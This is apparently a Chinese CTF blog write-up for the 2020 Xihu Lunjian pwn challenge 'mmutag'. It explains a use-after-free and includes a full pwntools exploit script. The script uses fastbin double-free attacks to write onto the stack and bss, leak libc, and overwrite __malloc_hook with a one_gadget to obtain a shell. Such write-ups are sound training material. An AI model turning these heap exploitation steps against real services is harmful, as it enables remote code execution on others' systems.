---
layout: post
title: 西湖论剑2020
description: pwn-mmutag
categories: CTF/PWN


---



<!-- more -->

# 前言

这道题非常简单,第一种方法是fastbin_attack返回到栈中，然后泄漏canary和libc，然后覆盖返回地址为One_Gadget

我自己脑子抽风用了第二种方法，也是提升自己布置堆风水的能力

# 逻辑分析

1.这道题一开始给了我们一个gift:栈上的地址，分配堆的大小都是0x68,有个UAF的漏洞，但是只能布置10个堆，同时可以修改栈上的内容，并输出栈上的内容

![](/images/character8/mmutag1)

# 思路

首先这道题无论分配和释放都只能用到fastbin,所以只能用fastbin_attack,同时给了我们栈上的地址,且能输出栈上的内容,那毫无疑问是用fastbin_attack分配到栈中泄漏地址和ROP了,但同时我们可以注意到我们分配的栈上的地址是0x7f开头的,我们可以控制bss段heap的分配位置，如果我们能构成p64(0x7f)，也是能分配到bss上进行操作的,所以我运用了堆的思想又分配到了bss段中，这样可以多次使用fastbin_attack了，然后fastbin_attack分配到malloc_hook-0x23将malloc_hook修改为one_gadget然后getsehll

# 代码

```python
#https://github.com/matrix1001/welpwn

from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))

    debugg = 1
    logg = 0

    ctx.binary = './mmutag'
    ctx.remote_libc = './libc.so.6'
    
    ctx.debug_remote_libc = False # True for debugging remote libc, false for local.

    #ctx.breakpoints = [0x,0x]
    ctx.symbols = {'heap_pool':0x6020c0}
    #ctx.debug()
    if debugg:
    	rs()
    else:
		ctx.remote = ('183.129.189.62', 58604)
		rs(method = 'remote')
    if logg:
	    context.log_level = 'debug'
    # rs('remote') # uncomment this for exploiting remote target

    libc = ctx.libc # ELF object of the corresponding libc.
    
    def Choice(num):
    	sla('choise:',num)
    def Add(idx,content=" "):
    	Choice(1)
    	sla('id:',idx)
    	sa('content',content)
    	ru('OK')
    '''
    def Edit(idx,content):
    	Choice(4)
    	sla('Index:',idx)
    	sla('Content:',content)
    '''
    def Del(idx,):
    	Choice(2)
    	sla('id',idx)
    	ru('OK')
    
    def Set_stack(content):
    	Choice(3)
    	s(content)
    	ru('Your')
    context.arch = "amd64"

    payload = p64(0)+p64(0x71)+p64(0)+p64(0)
    sla('please input you name:',payload)
    ru("this is your tag: 0x")
    
    stack_addr = r(12)
    stack_addr = int(stack_addr,16)
    success("stack_addr:0x%x",stack_addr)

    sleep(0.1)
    sla('choice',2)
    
    Add(3)
    Add(4)
 
    Del(3)
    Del(4)
    Del(3)

    payload = p64(0)+p64(0x71)+p64(0)+p64(0)
    Set_stack(payload)
    Add(5,p64(stack_addr-0x40))
    Add(6)
    Add(7,p64(0))

    Add(1,'a'*0x40+'b'*0x8)

    Set_stack('a'*0x20)
    ru('b'*0x8)
    libc_base = uu64(r(6))-0x20840
    success('libc:0x%x',libc_base)
    malloc_hook = libc_base + 0x3c4aed
    one_gadget = libc_base + 0xf0364

    Del(3)
    Del(4)
    Del(3)


    payload = p64(0x6020c5)
    Add(8,payload)
    Add(9)
    Add(10)

    Add(2,'\x00'+p64(0)*6)

    Del(10)
    Del(9)
    Del(10)
    Add(3,p64(malloc_hook))
    Add(4)
    Add(5)
    Add(6,'\x00'*3+p64(one_gadget)*8)
    success("one_gadget:0x%x",one_gadget)
    

    Set_stack('\x00'*0x20)
    success('one_gadget:0x%x',one_gadget)

    Choice(1)
    sla('id:',8)
    



    irt()
    # ipy() # if you have ipython, you can use this to check variables.



```

如果想看第一种方法的可以参考：https://bbs.pediy.com/thread-262526.htm
